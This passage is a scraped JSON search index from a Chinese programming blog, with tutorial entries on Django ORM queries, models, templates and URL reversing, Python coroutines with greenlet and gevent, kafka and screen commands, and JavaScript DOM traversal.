aParent = models.ForeignKey('self', on_delete=models.CASCADE, null=True, blank=True) # 和自己关联 class Meta: db_table = 'areainfo' # 指定表名 managed = False # 告诉 Django 不要管理这个类对应的表的创建,修改和删除(migrate) ","date":"2020-10-14 09:22","objectID":"/post/2047/:0:0","tags":["python","django"],"title":"django-模型元选项","uri":"/post/2047/"},{"categories":["python"],"content":"1.在models.py中添加一个类 class BookInfoManager(models.Manager): \"\"\"自定义模型管理器\"\"\" # 1. 改变查询的结果集 # 比如现在通过all方法是查询所有的结果,但是我们不想要is_delete=1的数据 def all(self): \"\"\"重新封装all方法\"\"\" # 1. 调用父类的all方法 books = super().all() # 2. 过滤is_delete=1的数据 books = books.exclude(is_delete=1) return books # 2. 添加额外的方法 # 封装一个添加数据的方法 def create_book(self, btitle, bpub_date, bread, bcomment): # self是BookInfoManager实例化后的对象 # book_obj = BookInfo() # 类名写死了不好,用下面的方法 print(self) # self是BookInfoManager实例化后的对象 print(self.model) # self.model可以获取到调用的模型类名,\u003cclass 'booktest2.models.BookInfo'\u003e book_obj = self.model() # 加括号就可以实例化一个模型类对象 book_obj.btitle = btitle book_obj.bpub_date = bpub_date book_obj.bread = bread book_obj.bcomment = bcomment book_obj.save() return self 2.修改模型类 class BookInfo(models.Model): # 图书名称 btitle = models.CharField(max_length=20) # 出版日期 bpub_date = models.DateField() # 阅读量 bread = models.IntegerField(default=0) # 评论量 bcomment = models.IntegerField(default=0) # 删除标记 is_delete = models.BooleanField(default=0) # 自定义管理器对象,替换继承的objects objects = BookInfoManager() def __str__(self): return self.btitle ","date":"2020-10-13 18:32","objectID":"/post/2045/:0:0","tags":["python","django"],"title":"django-模型自定义模型管理器","uri":"/post/2045/"},{"categories":["python"],"content":"关联查询（一对多） 多类中定义的建立关联的类属性叫做【关联属性】 定义模型类 # 定义一个模型类，继承models.Model class BookInfo(models.Model): # # id字段,不写也可以，默认就会有id字段 # id = models.AutoField(primary_key=True) # 图书名称字段。字符数据类型字段，最大长度20 btitle = models.CharField(max_length=20, null=False) # 图书出版日期字段。 bpub_date = models.DateField() def __str__(self): return self.btitle # 定义一个人物模型类,与图书类是一对多的关系 class HeroInfo(models.Model): # 人物姓名 hname = models.CharField(max_length=20) # 人物性别 hgender = models.BooleanField(default=False) # 备注 hcomment = models.CharField(max_length=100) # 一本书对应多个人物,在人物这边加外键。关联BookInfo表 hbook = models.ForeignKey('BookInfo', on_delete=models.SET_NULL, null=True, to_field=\"id\") def __str__(self): return self.hname 导入模型类： from app1.moldels import BookInfo,HeroInfo ** 例1：查询id为1的图书关联的英雄的信息。** 通过对象查询 # 先查询id=1的图书 b = BookInfo.objects.get(id=1) # 查询关联的英雄 # select * from booktest2_heroinfo where hbook_id = 1 b.heroinfo_set.all() 通过模型类查询： # hbook是关联属性 HeroInfo.objects.filter(hbook__id=1) ** 例2：查询id为10的英雄关联的图书信息。 ** # 先查询id=10的英雄 h = HeroInfo.objects.get(id=10) # 在查询关联的图书 # select * from booktest2_bookinfo where id = 3 # h.hbook_id是3 h.hbook 例2: 通过模型类查询 最终的结果是谁就写那个模型类,多对一的关系中,如果这边是一的话，就使用类名小写+字段+比较类型 做为条件 BookInfo.objects.filter(heroinfo__id=10) 例1：查询图书信息，要求图书关联的英雄的描述包含'八' 最终的结果是谁就写那个模型类,多对一的关系中,如果这边是一的话，就使用类名小写+字段+比较类型 做为条件 BookInfo.objects.filter(heroinfo__hcomment__contains='八') 例2：查询图书信息，要求图书中的英雄的id大于3. BookInfo.objects.filter(heroinfo__id__gt=3) 例3：查询书名为“天龙八部”的所有英雄。 HeroInfo模型类有关联属性，就用关联属性hbook查询 HeroInfo.objects.filter(hbook__btitle='天龙八部') ","date":"2020-10-13 16:02","objectID":"/post/2044/:1:0","tags":["python","django"],"title":"django-模型关联查询","uri":"/post/2044/"},{"categories":["python"],"content":"官方文档: https://docs.djangoproject.com/zh-hans/3.1/topics/db/aggregation/ ","date":"2020-10-13 13:10","objectID":"/post/2041/:0:0","tags":["python","django"],"title":"django-模型聚合函数","uri":"/post/2041/"},{"categories":["python"],"content":"聚合函数 作用：对查询结果进行聚合操作。将一列数据做为一个整体,进行纵向计算 sum count avg max min 使用前导入： from django.db.models import Sum, Count, Avg, Max, Min 例：查询所有记录的总数目。 BookInfo.objects.all().aggregate(Count('id')) {'id__count': 5} 例：查询所有图书阅读量的总和。 BookInfo.objects.aggregate(Sum('bread')) {'bread__sum': 126} 例：查询记录的总数目,bread字段的最大值和最小值，还可以提供别名 BookInfo.objects.aggregate(book_nums=Count('id'), read_height=Max('bread'), read_low=Min('bread')) {'book_nums': 5, 'read_height': 58, 'read_low': 0} 例：查询is_delete字段为0的数目 # 可以配合filter等方法使用，先查出条件符合的记录,在做聚合 BookInfo.objects.filter(is_delete=0).aggregate(nums=Count('id')) 查询所有的时候all()可以省略 ","date":"2020-10-13 13:10","objectID":"/post/2041/:1:0","tags":["python","django"],"title":"django-模型聚合函数","uri":"/post/2041/"},{"categories":["python"],"content":"Q对象~、\u0026、|查询 作用：用于多个条件的查询 使用之前需要先导入： from django.db.models import Q 例：查询id字段大于3和bread字段大于30的记录 # 默认指定多个参数就是和的意思 # select * from booktest2_bookinfo where bread\u003e30 and id \u003e3 BookInfo.objects.filter(id__gt=3, bread__gt=30) # 使用Q对象的方式 # select * from booktest2_bookinfo where bread\u003e30 and id \u003e3 BookInfo.objects.filter(Q(id__gt=3) \u0026 Q(bread__gt=30)) 例：查询id字段大于3或bread字段大于30的记录 # select * from booktest2_bookinfo where bread\u003e30 or id \u003e3 BookInfo.objects.filter(Q(id__gt=3) | Q(bread__gt=30)) 例：查询id不等于3图书的信息。 select * from booktest2_bookinfo where not id=3; BookInfo.objects.filter(~ Q(id=3)) ","date":"2020-10-13 11:31","objectID":"/post/2040/:1:0","tags":["python","django"],"title":"django-模型查询函数F\u0026amp;Q对象,多条件查询","uri":"/post/2040/"},{"categories":["python"],"content":"F对象（比较查询） 作用：用于字段之间的比较。 使用之前需要先导入： from django.db.models import F 例：查询bread字段大于bcomment字段的记录 BookInfo.objects.filter(bread__gt=F('bcomment')) 例：查询bread字段大于bcomment字段2倍的记录 BookInfo.objects.filter(bread__gt=F('bcomment')*2) ","date":"2020-10-13 11:31","objectID":"/post/2040/:2:0","tags":["python","django"],"title":"django-模型查询函数F\u0026amp;Q对象,多条件查询","uri":"/post/2040/"},{"categories":["python"],"content":"通过模型类.objects属性可以调用如下函数 get: 返回表中满足条件的一条且只能有一条数据。返回值是一个模型类对象。参数中写查询条件。 1)如果查到多条数据，则抛异常MultipleObjectsReturned 2)查询不到数据，则抛异常：DoesNotExist all: 返回模型类对应表的所有数据。返回值是QuerySet类型 filter: 返回满足条件的数据。返回值是QuerySet类型 参数写查询条件。 exclude: 返回不满足条件的数据。返回值是QuerySet类型 参数写查询条件。 order_by: 对查询结果进行排序。返回值是QuerySet类型 参数中写根据哪些字段进行排序。 ","date":"2020-10-13 09:27","objectID":"/post/2032/:0:0","tags":["python","django"],"title":"django-模型查询函数","uri":"/post/2032/"},{"categories":["python"],"content":"all: 所有数据 # BookInfo模型类对应表的所有数据 b = BookInfo.objects.all() ","date":"2020-10-13 09:27","objectID":"/post/2032/:1:0","tags":["python","django"],"title":"django-模型查询函数","uri":"/post/2032/"},{"categories":["python"],"content":"filter:满足条件 # 指定查询 __exact(可忽略) iexact:不区分大小写 b = BookInfo.objects.filter(id__exact=1) # 这并不会查询，只有在调用的时候才会真正查询 b[0].btitle # 模糊查询 __contains # select * from booktest2_bookinfo where btitle like binray '%天%' b = BookInfo.objects.filter(btitle__contains=\"天\") # btitle字段含天的记录 b = BookInfo.objects.filter(btitle__startswith='天') # btitle字段以天开头的记录 b = BookInfo.objects.filter(btitle__endswith='部') # btitle字段以部结尾的记录 # 比较查询 __gt,__lt,__gte,__lte # select * from booktest2_bookinfo where id \u003e 2 b = BookInfo.objects.filter(id__gt=2) # id大于2的记录 # 范围查询 __in # select * from booktest2_bookinfo where id in (1, 3, 5) b = BookInfo.objects.filter(id__in=[1,3,5]) # id为1,3,5的记录 # 判空查询 __isnull # select * from booktest_bookinfo where btitle is null; b = BookInfo.objects.filter(btitle__isnull=True) # 查询btitle字段为null的记录 # 日期查询__xxx # 查找指定年月的记录 # select * from booktest2_bookinfo where bpub_date between '1980-01-01' and '1980-12-31' BookInfo.objects.filter(bpub_date__year=1980) # bpub_date字段是1980年的记录 # select * from booktest2_bookinfo where extract(month from bpub_date) = 5 BookInfo.objects.filter(bpub_date__month=5) # bpub_date字段是5月的记录 # 日期比较 from datetime import date # select * from booktest2_bookinfo where bpub_date \u003e '1980-01-01' BookInfo.objects.filter(bpub_date__gt=date(1980,1,1)) # 大于1980年1月1日的记录 # select * from booktest2_bookinfo where bpub_date \u003e= '1986-7-24' BookInfo.objects.filter(bpub_date__gte='1986-7-24') # 大于等于1986年7月24日的记录 ","date":"2020-10-13 09:27","objectID":"/post/2032/:2:0","tags":["python","django"],"title":"django-模型查询函数","uri":"/post/2032/"},{"categories":["python"],"content":"exclude: 排除 # 查询id不为3的记录 select * from booktest2_bookinfo where not id=3; BookInfo.objects.exclude(id=3) ","date":"2020-10-13 09:27","objectID":"/post/2032/:3:0","tags":["python","django"],"title":"django-模型查询函数","uri":"/post/2032/"},{"categories":["python"],"content":"order_by: 排序 # 按照id从小到大排序 BookInfo.objects.all().order_by('id') # 按照id从大到小排序 BookInfo.objects.all().order_by('-id') # 可以基于上面几个方法进行排序 BookInfo.objects.filter(id__gt=2).order_by('id') # 先查找id\u003e2的记录，然后在根据id排序 ","date":"2020-10-13 09:27","objectID":"/post/2032/:4:0","tags":["python","django"],"title":"django-模型查询函数","uri":"/post/2032/"},{"categories":["python"],"content":"https://docs.djangoproject.com/zh-hans/3.1/ref/models/fields/#field-options ","date":"2020-10-12 17:36","objectID":"/post/2029/:0:0","tags":["python","django"],"title":"django-模型类常用字段类型","uri":"/post/2029/"},{"categories":["python"],"content":"字段类型 AutoField 自动增长的IntegerField，通常不用指定，不指定时Django会自动创建属性名为id的自动增长属性。 BooleanField 布尔字段，值为True或False。 NullBooleanField 支持Null、True、False三种值 CharField 字符串。参数max_length表示最大字符个数 TextField 大文本字段，一般超过4000个字符时使用。 IntegerField 整数 DecimalField 十进制浮点数。参数max_digits表示总位数。参数decimal_places表示小数的位数。 FloatField 浮点数。参数同上。没有上面的精确度高 DateField 日期 1)auto_now表示每次保存时，自动设置该字段为当前时间，用于\"最后一次修改\"的时间戳，它总是使用当前日期，默认为false。 2)auto_now_add表示当对象第一次被创建时自动设置当前时间，用于创建的时间戳，它总是使用当前日期，默认为false。 3)auto_now_add和auto_now是相互排斥的，组合将会发生错误。只能二选一 TimeField 时间，参数同DateField DateTimeField 日期时间，参数同DateField。 FileField 上传文件字段。 ImageField 继承于FileField，对上传的内容进行校验，确保是有效的图片。 ","date":"2020-10-12 17:36","objectID":"/post/2029/:1:0","tags":["python","django"],"title":"django-模型类常用字段类型","uri":"/post/2029/"},{"categories":["python"],"content":"字段属性 default 默认值。设置默认值。 primary_key 若为True，则该字段会成为模型的主键字段，默认值是False，一般作为AutoField的选项使用。 unique 如果为True, 这个字段在表中必须有唯一值，默认值是False。 db_index 若值为True, 则在表中会为此字段创建索引，默认值是False。 db_column 字段的名称，如果未指定，则使用属性的名称。 null 如果为True，表示允许为空，默认值是False。 blank 如果为True，则该字段允许为空白，默认值是False。决定后台管理的表单输入框可否为空 ","date":"2020-10-12 17:36","objectID":"/post/2029/:2:0","tags":["python","django"],"title":"django-模型类常用字段类型","uri":"/post/2029/"},{"categories":["python"],"content":"raise ImproperlyConfigured(‘mysqlclient 1.4.0 or newer is required; you have %s.’ % Database.version) django.core.exceptions.ImproperlyConfigured: mysqlclient 1.4.0 or newer is required; you have 0.10.1. 修改__init__.py(settings.py同级目录下) import pymysql pymysql.install_as_MySQLdb() pymysql.version_info = (1, 4, 13, \"final\", 0) ","date":"2020-10-12 16:54","objectID":"/post/2028/:0:0","tags":["python","django"],"title":"django3.1使用pymysql报错  mysqlclient 1.4.0 or newer is required; you have 0.10.1.","uri":"/post/2028/"},{"categories":["python"],"content":" 配置应用下的admin.py from django.contrib import admin from booktest.models import BookInfo, HeroInfo class BookInfoAdmin(admin.ModelAdmin): \"\"\"图书模型管理类\"\"\" # 自定义显示哪些字段 list_display = ['id', 'btitle', 'bpub_date'] class HeroInfoAdmin(admin.ModelAdmin): \"\"\"人物模型管理类\"\"\" # 自定义显示哪些字段 list_display = ['id', 'hname', 'hgender', 'hcomment', 'hbook_id', 'hbook'] # 注册模型类,只有注册的模型类才会显示在后台管理中 admin.site.register(BookInfo, BookInfoAdmin) admin.site.register(HeroInfo, HeroInfoAdmin) 2.将 xxx object显示为自定义内容 43487-af42efuk2m9.png 在models.py中修改个模型类添加__str__方法 def __str__(self): return self.btitle ","date":"2020-10-12 12:56","objectID":"/post/2026/:0:0","tags":["python","django"],"title":"django-后台字段显示配置","uri":"/post/2026/"},{"categories":["python"],"content":"定义 1.定义模型类： from django.db import models # Create your models here. # 定义一个模型类,表名BookInfo,继承models.Model class BookInfo(models.Model): # # id字段,不写也可以，默认就会有id字段 # id = models.AutoField(primary_key=True) # 图书名称字段。字符数据类型字段 btitle = models.CharField(max_length=20, null=False) # 图书出版日期字段。 bpub_date = models.DateField() # 定义一个人物模型类,与图书类是一对多的关系 class HeroInfo(models.Model): # 人物姓名 hname = models.CharField(max_length=20) # 人物性别 hgender = models.BooleanField(default=False) # 备注 hcomment = models.CharField(max_length=100) # 一本书对应多个人物,在人物这边加外键。关联BookInfo表的id字段 hbook = models.ForeignKey('BookInfo', on_delete=models.SET_NULL, null=True, to_field=\"id\") on_delete参数： 级联删除：models.CASCADE 当关联表中的数据删除时，该外键也删除 置空：models.SET_NULL 当关联表中的数据删除时，该外键置空，当然，你的这个外键字段得允许为空，null=True 设置默认值：models.SET_DEFAULT 删除的时候，外键字段设置为默认值，所以定义外键的时候注意加上一个默认值。 to_field参数： 自定义关联表的id 2.生成迁移脚本 # 将模型类生成django识别的迁移脚本 python manage.py makemigrations 3.生成表 # 根据迁移脚本生成表 python manage.py migrate 每次修改模型类,需要重新生成迁移脚本,然后再生成表 ","date":"2020-10-12 09:25","objectID":"/post/2024/:1:0","tags":["python","django"],"title":"django-模型类,基本操作","uri":"/post/2024/"},{"categories":["python"],"content":"操作 进入django shell python manage.py shell \u003e\u003e\u003e from booktest.models import BookInfo # 自己实例化一个书对象,然后插入数据 \u003e\u003e\u003e b = BookInfo() \u003e\u003e\u003e b.btitle = '天龙八部' \u003e\u003e\u003e from datetime import date \u003e\u003e\u003e b.bpub_date = date(1990,1,1) \u003e\u003e\u003e b.save() # 获取表中所有数据 b1 = BookInfo.objects.all() b1[0].btitle # 通过条件查找,查找的记录必须是唯一的。返回一个对象 b2 = BookInfo.objects.get(id=1) # 使用这个对象可以进行读取、修改、删除等操作 b2.btitle b2.delete() ** 通过人物获取书名 ** # 人物对象,插入数据 \u003e\u003e\u003e h1 = HeroInfo() \u003e\u003e\u003e h1.hname = '虚竹' \u003e\u003e\u003e h1.hgender = False \u003e\u003e\u003e h1.hcomment = '和尚' \u003e\u003e\u003e h1.hbook_id = 1 \u003e\u003e\u003e h1.save() # 通过条件查找,查找的记录必须是唯一的。返回一个对象 h2 = HeroInfo.objects.get(id=1) # 使用这个对象可以进行读取、修改、删除等操作 h2.hname # 获取外键id h2.hbook_id # 当前人物关联的表的记录(返回对象) h2.hbook # 获取人物对应的书名 h2.hbook.btitle ** 通过书名获取人物信息 ** b = BookInfo.objects.get(id=1) # 返回关联的所有人物对象 b.heroinfo_set.all() ","date":"2020-10-12 09:25","objectID":"/post/2024/:2:0","tags":["python","django"],"title":"django-模型类,基本操作","uri":"/post/2024/"},{"categories":["python"],"content":"串行执行程序 import time import random def producer(): res = [] for i in range(9999990): res.append(i) return res def consumer(c): x = 0 for i in c: x += i return x start = time.time() res = producer() print(consumer(res)) print(time.time() - start) ","date":"2020-10-12 08:37","objectID":"/post/2023/:1:0","tags":["python"],"title":"python-协程","uri":"/post/2023/"},{"categories":["python"],"content":"yield并发执行程序 def producer(g): res = \"\" for i in range(9999990): res = g.send(i) return res def consumer(): num = 0 while True: x = yield num # x是send发送来的值 num += x start = time.time() c1 = consumer() next(c1) print(producer(c1)) print(time.time() - start) 上面的两种方式执行结果是串行比较快 因为下面的并发执行中没有遇到IO,在两个函数之间交替运行,cpu频繁进行上下文切换，反而会降低速度 上面的串行中只切换一次,所以上面的串行比并发快在上下文切换上了。 虽然上面用了多任务交替运行，但是没有遇到IO其实是没必要切换的. 但是目前只是使用yield的话，并不能 识别到有IO操作 再做切换操作 ","date":"2020-10-12 08:37","objectID":"/post/2023/:2:0","tags":["python"],"title":"python-协程","uri":"/post/2023/"},{"categories":["python"],"content":"使用greenlet模块,可以简化函数间切换的操作，但也不能解决IO问题 from greenlet import greenlet def test1(): print(12) gr2.switch() # 切换到gr2 print(34) def test2(): print(56) gr1.switch() # 切换到gr1 print(78) gr1 = greenlet(test1) gr2 = greenlet(test2) gr1.switch() # 执行过程 test1[print(12)] --\u003e test2[print(56)] --\u003e test1[print(34)] 程序结束 # 下面的执行效率比yield要慢很多，不知道为什么 X = 0 NUM = 0 def producer(area): global X for i in range(area): # 9999990 X = i g2.switch() def consumer(): global NUM while True: NUM += X g1.switch() # 不可以传函数参数 g1 = greenlet(producer) g2 = greenlet(consumer) start = time.time() # 切换到g1运行,可以传参 g1.switch(9999990) print(NUM) print(time.time() - start) ","date":"2020-10-12 08:37","objectID":"/post/2023/:3:0","tags":["python"],"title":"python-协程","uri":"/post/2023/"},{"categories":["python"],"content":"Gevent模块 import gevent from gevent import monkey # 默认不支持阻塞其他IO操作[默认支持gevent.sleep(3)],要支持其他IO操作需要打补丁。 monkey.patch_all() def eat(name): print(\"%s eat 1 \" % name) # gevent.sleep(3) time.sleep(2) print(\"%s eat 2 \" % name) def play(name): print(\"%s play 1 \" % name) time.sleep(3) print(\"%s play 2 \" % name) # 创建协程任务，gevent遇到阻塞就会切换执行协程任务 g1 = gevent.spawn(eat, \"soulchild\") g2 = gevent.spawn(play, \"soulchild\") print(\"ok\") for i in range(5): print(i) # 模拟IO阻塞,这时g1和g2会被调用 time.sleep(0.1) # 模拟IO阻塞,这时g1和g2会被调用 gevent.joinall([g1, g2]) ","date":"2020-10-12 08:37","objectID":"/post/2023/:4:0","tags":["python"],"title":"python-协程","uri":"/post/2023/"},{"categories":["python"],"content":"settings.py配置三个部分 # 添加内置标签配置 TEMPLATES = [ { ...... 'OPTIONS': { ...... 'builtins': ['django.templatetags.static'] }, }, ] # 配置静态文件url路径 STATIC_URL = '/static/' # 配置静态文件路径 STATICFILES_DIRS = [ os.path.join(BASE_DIR, \"static\") ] 配置完成后就可以在模板中直接使用了 \u003cscript src=\"{% static \"js/jquery.js\" %}\" \u003e\u003c/script\u003e ","date":"2020-10-11 19:58","objectID":"/post/2022/:0:0","tags":["python","django"],"title":"django-静态文件配置","uri":"/post/2022/"},{"categories":["python"],"content":"默认html转义是开启的，比如\u003ch1\u003eok\u003ch1\u003e会被转成\u0026lt;h1\u0026gt;ok\u0026lt;/h1\u0026gt;。在网页中所见即所得 {“content”: “ok”} 1.过滤器关闭转义 {{ content | safe }} {# 在网页中显示的是h1标题 #} 2.标签关闭转义 {% autoescape off %} {{ content }} {# 在网页中显示的是h1标题 #} {% endautoescape %} ","date":"2020-10-10 18:19","objectID":"/post/2019/:0:0","tags":["python","django"],"title":"django-模板关闭html转义","uri":"/post/2019/"},{"categories":["python"],"content":"父模版 \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003ctitle\u003e{% block title %} 默认 {% endblock %}\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003eheader\u003c/h1\u003e {% block b1 %} \u003cp\u003e模板继承，我是默认内容，可以被修改\u003c/p\u003e {% endblock b1 %} \u003ch1\u003efooter\u003c/h1\u003e \u003c/body\u003e \u003c/html\u003e 子模板 {% extends 'tpl/index.html' %} {% block title %} 新的标题 {% endblock %} {% block b1 %} {{ block.super }} {# 获取模版默认的内容 #} \u003cp\u003e替换父模板的内容\u003c/p\u003e {% endblock %} ","date":"2020-10-10 18:03","objectID":"/post/2018/:0:0","tags":["python","django"],"title":"django-模板继承","uri":"/post/2018/"},{"categories":["python"],"content":"1.变量 普通变量: x = 'ok' {{ x }} 字典:d1 = {\"name\": \"zs\"} {{ d1.name }} 列表: l1 = [0,1,2,3,4] {{ l1.0 }} ","date":"2020-10-10 15:13","objectID":"/post/2015/:1:0","tags":["python","django"],"title":"django-模板基本操作","uri":"/post/2015/"},{"categories":["python"],"content":"2.if判断 \u003c!-- 也可以if in xxx--\u003e {% if score \u003c 60 %} \u003cp\u003e成绩不及格\u003c/p\u003e {% elif score == 60 %} \u003cp\u003e刚刚及格\u003c/p\u003e {% else %} \u003cp\u003e成绩及格\u003c/p\u003e {% endif %} ","date":"2020-10-10 15:13","objectID":"/post/2015/:2:0","tags":["python","django"],"title":"django-模板基本操作","uri":"/post/2015/"},{"categories":["python"],"content":"3.for循环 \u003cul\u003e {% for i in l1 %} \u003cli\u003e{{ i }}\u003c/li\u003e {% endfor %} \u003c/ul\u003e \u003c!-- 反向遍历 --\u003e \u003cul\u003e {% for i in l1 reversed %} \u003cli\u003e{{ i }}\u003c/li\u003e {% endfor %} \u003c/ul\u003e \u003c!-- empty --\u003e \u003cul\u003e {% for i in l1 %} \u003cli\u003e{{ i }}\u003c/li\u003e {% empty %} \u003cli\u003el1没有内容\u003c/li\u003e {% endfor %} \u003c/ul\u003e {{ forloop.counter }}:当前循环的计数，从1开始 {{ forloop.counter0 }}:当前循环的计数，从0开始 {{ forloop.revcounter }}:倒序的循环计数,到1结束 {{ forloop.revcounter0 }}:倒序的循环计数,到0结束 {{ forloop.first }}: 布尔值,是否为第一次循环 {{ forloop.last }}: 布尔值,是否为最后一次循环 {{ forloop.parentloop }}: 上一级循环 ","date":"2020-10-10 15:13","objectID":"/post/2015/:3:0","tags":["python","django"],"title":"django-模板基本操作","uri":"/post/2015/"},{"categories":["python"],"content":"4.url标签 https://soulchild.cn/2013.html 其他内置标签:https://docs.djangoproject.com/zh-hans/2.2/ref/templates/builtins/#built-in-tag-reference ","date":"2020-10-10 15:13","objectID":"/post/2015/:4:0","tags":["python","django"],"title":"django-模板基本操作","uri":"/post/2015/"},{"categories":["python"],"content":"5.过滤器 过滤器理解为函数,方便使用的小功能 所有内置过滤器：https://docs.djangoproject.com/zh-hans/2.2/ref/templates/builtins/#built-in-filter-reference 自定义过滤器: https://soulchild.cn/2049.html ","date":"2020-10-10 15:13","objectID":"/post/2015/:5:0","tags":["python","django"],"title":"django-模板基本操作","uri":"/post/2015/"},{"categories":["python"],"content":"5.1 add 相加 {{ 1|add:1 }} \u003c!-- 2 --\u003e {{ l1|add:l2 }} \u003c!-- 两个列表合并 --\u003e {{ 1|add:\"a\" }} \u003c!-- 不能加 --\u003e {{ 1|add:\"1\" }} \u003c!-- 2 --\u003e ","date":"2020-10-10 15:13","objectID":"/post/2015/:5:1","tags":["python","django"],"title":"django-模板基本操作","uri":"/post/2015/"},{"categories":["python"],"content":"5.2 cut 替换 \u003c!-- 替换所有的内容 --\u003e {{ \"abc1a2bc3d\"|cut:'a' }} \u003c!-- bc12bc3d --\u003e ","date":"2020-10-10 15:13","objectID":"/post/2015/:5:2","tags":["python","django"],"title":"django-模板基本操作","uri":"/post/2015/"},{"categories":["python"],"content":"5.3 date时间格式化 https://docs.djangoproject.com/zh-hans/2.2/ref/templates/builtins/#date # 返回给模板时间对象 return render(request, 'index.html', {'today': datetime.now()}) {{ today|date }} \u003c!-- 2020年10月10日 --\u003e {{ today|date:'Y-m-d H:i:s' }} \u003c!-- 2020-10-10 11:10:23 --\u003e ","date":"2020-10-10 15:13","objectID":"/post/2015/:5:3","tags":["python","django"],"title":"django-模板基本操作","uri":"/post/2015/"},{"categories":["python"],"content":"app_name和namespace介绍https://www.liujiangblog.com/course/django/136 ","date":"2020-10-10 11:01","objectID":"/post/2013/:0:0","tags":["python","django"],"title":"django-url反向解析","uri":"/post/2013/"},{"categories":["python"],"content":"1.配置根url # 指定包含的url为tpl.urls，app_name为tpl,命名空间为\"tpl\" path('', include(('tpl.urls', 'tpl'), namespace=\"tpl\")) # 另外一种写法 # 没有指定app_name,需要到App.urls文件中添加app_name = 'App' path('', include('App.urls', namespace=\"App\")), 获取当前的app_name和namespace request.resolver_match ","date":"2020-10-10 11:01","objectID":"/post/2013/:1:0","tags":["python","django"],"title":"django-url反向解析","uri":"/post/2013/"},{"categories":["python"],"content":"2.配置具体url的name urlpatterns = [ path('login/', views.login, name=\"login\"), path('reverse_url/', views.reverse_url, name=\"reverse_url\"), path('reverse_test/', views.reverse_test, name=\"reverse_test\"), re_path(r'(.*?)/(.*?)/', views.url1, name=\"url1\"), re_path(r'(?P\u003carg1\u003e.*?)/(?P\u003carg2\u003e.*?)/', views.url1, name=\"url2\"), ] ","date":"2020-10-10 11:01","objectID":"/post/2013/:2:0","tags":["python","django"],"title":"django-url反向解析","uri":"/post/2013/"},{"categories":["python"],"content":"2.模板语法 写死的 \u003ca href=\"/login/\"\u003e普通url,写死\u003c/a\u003e 模板语法 \u003c!-- tpl是namespace,login是url的名称，上面name定义的 --\u003e \u003ca href=\"{%url 'tpl:login' %}\"\u003e根据namespace获取\u003c/a\u003e 带参数的 # 位置参数 \u003ca href=\"{%url 'tpl:login' '参数1' '参数2' %}\"\u003e根据namespace获取\u003c/a\u003e # 命名参数 \u003ca href=\"{%url 'tpl:url2' arg1='soulchild' arg2=12 %}\"\u003e根据namespace获取的,命名参数url: {%url 'tpl:url2' arg1='soulchild' arg2=12 %}\u003c/a\u003e ","date":"2020-10-10 11:01","objectID":"/post/2013/:3:0","tags":["python","django"],"title":"django-url反向解析","uri":"/post/2013/"},{"categories":["python"],"content":"3.python中reverse反向获取url 不带参数 def reverse_test(request): print(reverse(\"tpl:login\")) return HttpResponse(\"python reverse\") 位置参数 def reverse_test(request): print(reverse(\"tpl:url1\", args=('arg1', 'arg2'))) return HttpResponse(\"python reverse\") 命名参数 def reverse_test(request): print(reverse(\"tpl:url2\", kwargs={'arg1': '1', 'arg2': '2'})) return HttpResponse(\"python reverse\") ","date":"2020-10-10 11:01","objectID":"/post/2013/:4:0","tags":["python","django"],"title":"django-url反向解析","uri":"/post/2013/"},{"categories":["python"],"content":"1.安装pymysql pip install pymysql 2.修改settings.py DATABASES = { 'default': { 'ENGINE': 'django.db.backends.mysql', 'NAME': 'django_test', 'USER': 'root', 'PASSWORD': '123456', 'HOST': 'localhost', 'PORT': '3306', } } 更多参数: https://docs.djangoproject.com/zh-hans/2.2/ref/settings/#engine 3.修改项目的__init__.py(和settings.py同级目录) from pymysql import install_as_MySQLdb install_as_MySQLdb() ","date":"2020-10-09 19:11","objectID":"/post/2012/:0:0","tags":["python"],"title":"django-配置mysql","uri":"/post/2012/"},{"categories":["系统服务"],"content":"列出消费者组 ./kafka-consumer-groups.sh --bootstrap-server ip:9092,ip:9092,ip:9092 --list 消费组详细信息 ./kafka-consumer-groups.sh --bootstrap-server {kafka连接地址} --describe --group {消费组} 删除消费者组 ./kafka-consumer-groups.sh --bootstrap-server ip:9092,ip:9092,ip:9092 --delete --group bbbb ","date":"2020-10-07 17:22","objectID":"/post/2772/:0:0","tags":["kafka"],"title":"kafka操作删除消费者组","uri":"/post/2772/"},{"categories":["基础内容"],"content":" # 创建新会话窗口 screen # 创建新会话窗口-带名称 screen -S s1 # 离开会话窗口 Ctrl + a, d # 查看所有会话窗口 screen -ls # 进入已存在的会话窗口 screen -r (id or name) # 断开指定的会话窗口 screen -d (id or name) # 杀掉当前会话窗口(杀掉会话窗口,窗口将不存在) Ctrl + a, k 或 退出终端Ctrl + d ","date":"2020-10-07 16:53","objectID":"/post/2771/:0:0","tags":["linux"],"title":"Screen常用命令","uri":"/post/2771/"},{"categories":["其他"],"content":" \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"parent\"\u003e \u003cdiv class=\"son\"\u003e\u003c/div\u003e \u003c/div\u003e \u003cspan\u003ebrother\u003c/span\u003e \u003cul\u003e \u003cli\u003eaaa\u003c/li\u003e \u003c/ul\u003e \u003cbutton\u003e删除第一个li节点\u003c/button\u003e \u003cscript\u003e // 元素节点 nodeType为1 // 属性节点 nodeType为2 // 文本节点 nodeType为3 var par = document.querySelector(\".parent\"); ///////////////////////////////获取子节点和元素////////////////////////////// //获取所有子节点 console.log(\"所有子节点:\",par.childNodes); // div有三个子节点，分别是\"换行符\"、\"div .son\"、\"换行符\" // 获取第一个和最后一个子节点 console.log(\"第一个子节点:\",par.firstChild); console.log(\"最后一个子节点:\",par.lastChild); // 获取所有子元素 console.log(\"所有子元素:\",par.children); // 获取第一个和最后一个子元素 console.log(\"第一个子元素:\",par.firstElementChild); console.log(\"最后一个子元素:\",par.lastElementChild); //////////////////////////////获取兄弟节点和元素////////////////////////////// //获取上一个和下一个兄弟节点 console.log(\"下一个兄弟节点:\",par.nextSibling); console.log(\"上一个兄弟节点:\",par.previousSibling); //获取上一个和下一个兄弟元素 console.log(\"下一个兄弟元素:\",par.nextElementSibling); // 下一个兄弟节点是span console.log(\"上一个兄弟元素:\",par.previousElementSibling); // 上一个兄弟节点是null 